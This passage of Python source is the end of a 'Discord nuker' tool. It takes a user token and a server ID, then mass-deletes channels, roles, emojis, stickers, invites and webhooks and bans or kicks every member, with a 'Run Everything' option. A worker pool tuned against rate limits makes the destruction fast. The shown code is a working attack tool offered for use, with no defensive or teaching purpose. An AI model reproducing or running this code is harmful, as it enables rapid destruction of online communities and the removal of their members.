    if not isinstance(Invites, list) or not Invites:
        ErrorBox("No Invites Found")
        return 0
    Count = 0
    for Invite in Invites:
        Code = SafeGet(Invite, "code")
        if not Code:
            continue
        NukerInstance.Queue.put_nowait(("DELETE", f"{ApiBase}/invites/{Code}", None))
        Count += 1
    return Count


async def DeleteWebhooks(NukerInstance: Nuker) -> int:
    if not NukerInstance.HasPerm(PermManageWebhooks):
        ErrorBox("Missing Manage Webhooks Permission")
        return 0
    Response = await NukerInstance.Request("GET", f"{ApiBase}/guilds/{NukerInstance.GuildId}/webhooks")
    if not Response or Response.status_code != 200:
        return 0
    Webhooks = SafeJson(Response)
    if not isinstance(Webhooks, list) or not Webhooks:
        ErrorBox("No Webhooks Found")
        return 0
    Count = 0
    for Webhook in Webhooks:
        WebhookId = SafeGet(Webhook, "id")
        if not WebhookId:
            continue
        NukerInstance.Queue.put_nowait(("DELETE", f"{ApiBase}/webhooks/{WebhookId}", None))
        Count += 1
    return Count


Actions: Dict[str, Tuple[str, Optional[Callable]]] = {
    "1": ("Delete Channels & Categories", DeleteChannels),
    "2": ("Delete Roles", DeleteRoles),
    "3": ("Ban All Members", BanMembers),
    "4": ("Kick All Members", KickMembers),
    "5": ("Delete Emojis", DeleteEmojis),
    "6": ("Delete Stickers", DeleteStickers),
    "7": ("Delete Invites", DeleteInvites),
    "8": ("Delete Webhooks", DeleteWebhooks),
    "9": ("Run Everything", None),
}


async def RunAction(NukerInstance: Nuker, Choice: str) -> int:
    if Choice == "9":
        Total = 0
        for Key in ["1", "2", "5", "6", "7", "8", "3"]:
            _, Function = Actions[Key]
            Total += await Function(NukerInstance)
        return Total
    _, Function = Actions[Choice]
    return await Function(NukerInstance)


def PrintActions() -> None:
    SafePrint("")
    SafePrint(
        f"{Purple}┌─ {BrightMagenta}{Bold}Mini Flay Discord Nuker{Reset} "
        f"{Purple}──────────────────────────────────────────┐{Reset}"
    )
    SafePrint(f"{Purple}│{Reset} {Teal}Available Actions{Reset}")
    SafePrint(f"{Purple}├──────────────────────────────────────────────────────────┤{Reset}")
    for Key in sorted(Actions.keys(), key=int):
        Name, _ = Actions[Key]
        if Key == "9":
            SafePrint(f"{Purple}│{Reset} {BrightRed}{Bold}[{Key}] {Name}{Reset}")
        else:
            SafePrint(f"{Purple}│{Reset} {Lime}[{Key}]{Reset} {White}{Name}{Reset}")
    SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
    SafePrint("")


async def Main() -> None:
    global StatsLock, StopEvent
    if not CheckHttp2():
        return
    StatsLock = asyncio.Lock()
    StopEvent = asyncio.Event()
    Stats.update(
        {
            "Done": 0,
            "Already": 0,
            "Failed": 0,
            "Retries": 0,
            "RateLimits": 0,
            "StartTime": 0.0,
        }
    )
    SafeClear()
    SafePrint("")
    SafePrint(
        f"{Purple}┌─ {BrightMagenta}{Bold}Configuration{Reset} "
        f"{Purple}────────────────────────────────────────────┐{Reset}"
    )
    Token = SafeGetpass(f"{Purple}│{Reset} {Teal}Token{Reset}  {Purple}➜{Reset} ")
    GuildId = SafeInput(f"{Purple}│{Reset} {Teal}Guild{Reset}  {Purple}➜{Reset} ")
    SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
    NukerInstance = Nuker(Token, GuildId)
    async with NukerInstance:
        if not await NukerInstance.ValidateAll():
            return
        PrintActions()
        Choice = SafeInput(f"  {Purple}➜{Reset} {Bold}Choose An Option:{Reset} ")
        if Choice not in Actions:
            ErrorBox("Invalid Option")
            return
        Stats["StartTime"] = time.time()
        Total = await RunAction(NukerInstance, Choice)
        if Total == 0:
            return
        SafePrint("")
        SafePrint(
            f"{Purple}┌─ {BrightMagenta}{Bold}Queue{Reset} "
            f"{Purple}─────────────────────────────────────────────────┐{Reset}"
        )
        SafePrint(f"{Purple}│{Reset} Total Operations Queued: {Lime}{Bold}{Total}{Reset}")
        SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
        Pool = WorkerPool(NukerInstance)
        await Pool.Start()
        Reporter = asyncio.create_task(ProgressReporter(Total))
        AutotuneTask = asyncio.create_task(Pool.Autotune())
        try:
            await NukerInstance.Queue.join()
        finally:
            StopEvent.set()
            AutotuneTask.cancel()
            Reporter.cancel()
            await Pool.Stop()
            await asyncio.gather(AutotuneTask, Reporter, return_exceptions=True)
            SafePrint("")
        SafePrint("")
        Elapsed = time.time() - Stats["StartTime"]
        Done = Stats["Done"]
        Already = Stats["Already"]
        Failed = Stats["Failed"]
        Retries = Stats["Retries"]
        RateLimits = Stats["RateLimits"]
        SafePrint(
            f"{Purple}┌─ {BrightMagenta}{Bold}Final Results{Reset} "
            f"{Purple}────────────────────────────────────────┐{Reset}"
        )
        SafePrint(f"{Purple}│{Reset} {BrightGreen}✔  Success   {Reset}: {Bold}{Done}/{Total}{Reset}")
        SafePrint(f"{Purple}│{Reset} {Gray}↷  Skipped   {Reset}: {Bold}{Already}{Reset}")
        SafePrint(f"{Purple}│{Reset} {BrightRed}✘  Failed    {Reset}: {Bold}{Failed}{Reset}")
        SafePrint(f"{Purple}│{Reset} {BrightYellow}↻  Retries   {Reset}: {Bold}{Retries}{Reset}")
        SafePrint(f"{Purple}│{Reset} {Lime}⏱  Rate Lmt  {Reset}: {Bold}{RateLimits}{Reset}")
        SafePrint(f"{Purple}│{Reset} {Lime}⏲  Time      {Reset}: {Bold}{Elapsed:.2f}s{Reset}")
        SafePrint(
            f"{Purple}│{Reset} {Pink}⚡  Avg Rate  {Reset}: "
            f"{Bold}{SafeDiv(Done, max(Elapsed, 0.01), 0):.1f}/s{Reset}"
        )
        SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")


def SignalHandler(Sig: int, Frame: Any) -> None:
    WarningBox("Interrupted — Shutting Down...")
    os._exit(1)


def RunMain() -> int:
    try:
        asyncio.get_running_loop()
        ErrorBox("Cannot Run Inside An Existing Event Loop")
        return 1
    except RuntimeError:
        pass
    try:
        asyncio.run(Main())
        return 0
    except KeyboardInterrupt:
        return 130
    except RuntimeError:
        return 1
    except Exception:
        return 1


if __name__ == "__main__":
    try:
        signal.signal(signal.SIGINT, SignalHandler)
    except Exception:
        pass
    try:
        sys.exit(RunMain())
    except SystemExit:
        raise
    except Exception:
        pass
